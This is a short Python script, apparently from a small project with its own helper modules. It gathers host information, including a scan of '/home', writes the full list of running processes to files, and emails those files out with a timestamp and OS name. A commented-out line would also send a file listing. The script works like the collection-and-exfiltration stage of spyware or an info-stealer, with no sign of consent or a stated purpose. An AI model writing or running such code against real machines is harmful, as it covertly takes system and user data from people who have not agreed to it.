import compInfo, emailing
import os, psutil
import datetime

def getProcessInfo():
    processStr = ""
    processes = psutil.process_iter()
    for process in processes:
        processStr += f"Process ID: {process.pid}, Name: {process.name()}\n"
    return processStr
    

info, files = compInfo.getInfo('/home')

with open("comp.txt", "w") as f:
    f.write(info)

with open("processes.txt", 'w') as f:
    f.write(getProcessInfo())

now = datetime.datetime.now()
name = os.name

emailing.emailAttachment("comp.txt", f"{now} {name}")
# emailing.emailAttachment("files.txt", f"{now} {name}")
emailing.emailAttachment("processes.txt", f"{now} {name}")



